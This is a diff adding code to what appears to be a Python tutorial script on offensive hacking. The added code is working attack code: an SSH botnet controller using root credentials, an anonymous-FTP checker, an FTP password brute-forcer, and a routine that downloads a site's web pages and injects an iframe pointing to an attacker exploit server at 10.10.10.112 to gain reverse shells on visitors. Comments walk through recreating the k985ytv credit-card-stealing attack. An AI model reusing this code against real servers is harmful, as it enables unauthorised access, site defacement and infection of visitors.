@@ -6,11 +6,13 @@ import os
 import nmap
 import time
 import crypt
+import ftplib
 import pexpect
 import zipfile
 import optparse
 from socket import *
 from threading import *
+from pexpect import pxssh
 
 
 def banner_and_service_example():
@@ -419,4 +421,154 @@ def key_main():
 
 # This is one remote host (or a computer) we just broke into. Malicious attackers
 # often use pools of such broken computers, also called a botnet for, well,
-# malicious purposes. 
+# malicious purposes.
+
+class Client:
+    def __init__(self, host, user, password):
+        self.host = host
+        self.user = user
+        self.password = password
+        self.session = self.connect()
+
+    def connect(self):
+        try:
+            s = pxssh.pxssh()
+            s.login(self.host, self.user, self.password)
+            return s
+        except Exception as e:
+            print(str(e))
+
+    def send_command(self, cmd):
+        self.session.sendline(cmd)
+        self.session.prompt()
+        return self.session.before
+
+
+def add_client(host, user, password):
+    bot_net.append(Client(host, user, password))
+
+
+def botnet_command(command):
+    for client in bot_net:
+        output = client.send_command(command)
+        print("Output from {}".format(client.host))
+        print("Output: {}".format(output))
+
+
+bot_net = []
+add_client('10.10.10.110', 'root', 'toor')
+add_client('10.10.10.120', 'root', 'toor')
+add_client('10.10.10.130', 'root', 'toor')
+botnet_command('uname -v')
+botnet_command('cat /etc/issue')
+
+# This script is attacking servers directly, but there are other ways to go about it as well.
+# For example, let's study the k985ytv attack, which a botnet to inject JavaScript and
+# redirect people who visit a site to download anti-virus software which stole credit card
+# information. How can you do this using python?
+
+# Before we go forward, let's talk more about FTP (file transfer protocol). You can use
+# the ftplib module to determine if any service offers anonymous FTP.
+
+
+def anonymous_login(hostname):
+    try:
+        ftp = ftplib.FTP(hostname)
+        ftp.login('anonymous', 'random@random.com')
+        print("Sucess with host: " + str(hostname))
+        ftp.quit()
+        return True
+    except Exception as e:
+        print("Unsuccessful with host: " + str(hostname))
+        return False
+
+
+host = '192.168.95.179'
+anonymous_login(host)
+
+# If you really wanna get in, and the host doesn't enable anonymous login, you can
+# brute force credentials, which attackers have been quite successful with in the
+# past.
+
+
+def brute_login(hostname, password_file):
+    file = open(password_file, 'r')
+    for line in file.readlines():
+        username = line.split(":")[0]
+        password = line.split(":")[1].strip('r').strip('\n')
+        print("Trying {}:{}".format(username, password))
+
+        try:
+            ftp = ftplib.FTP(hostname)
+            ftp.login(username, password)
+            print("[+] Login succeeded!")
+            ftp.quit()
+            return (username, password)
+
+        except:
+            pass
+
+    print("Couldn't find a username:password combination")
+    return (None, None)
+
+
+host = '192.168.95.179'
+passwdFile = 'ftp_pass.txt'
+
+# Once we have valid FTP credentials, it is good to know if server provides web service
+# (for the JS injection). On a server, the NLST command spits out a list of files, which
+# we can take advantage of.
+
+
+def check_ftp_webpages(ftp):
+    try:
+        dirlist = ftp.nlst()
+    except:
+        print("Couldn't find any directories :(")
+        return
+
+    pages = []
+    for file in dirlist:
+        fn = file.lower()
+
+        if '.php' in fn or '.html' in fn or '.asp' in fn:
+            pages.append(file)
+
+    return pages
+
+# Now that we have the pages, we can start injecting our own client side code to it!
+# Create a malicious server and page (MetaSploit is a good framework). Victims who
+# visit this page will be redirected and we'll receive a callback, through which we
+# can inject our JS. If connected, there'll be a reverse TCP shell created, and through
+# this shell, we'll execute commands as the administrator of the infected client.
+# The next step is simple: download the file, add whatever you want, and reupload the file.
+
+
+def fpt_injector(ftp, page, redirect):
+    file = open(page + '.tmp', 'w')
+    ftp.retrlines('RETR ' + page, file.write)
+    file.write(redirect)
+    file.close()
+    ftp.storlines('STOR ' + page, open(page + '.tmp'))
+
+# After the login and checking functions used earlier, call the injector by
+# redirect = '<iframe src='+\
+#   '"http://10.10.10.112:8080/exploit"></iframe>'
+# fpt_injector(ftp, 'index.html', redirect)
+#
+# which just redirects the main page to our malicious server, through which we gain
+# administrative access to that victim.
+
+
+def attack(username, password, tgtHost, redirect):
+    ftp = ftplib.FTP(tgtHost)
+    ftp.login(username, password)
+    defPages = check_ftp_webpages(ftp)
+    for defPage in defPages:
+        fpt_injector(ftp, defPage, redirect)
+
+# The k985ytv was just all this code (with the addition of trying anonymous access first, and
+# if that fails, try the brute force version). In under 100 lines of python code, this 
+# interesting attack can be set up. Incredible. 
+
+# The next attack we'll discuss compromised over 5 million workstations in 200 countries!
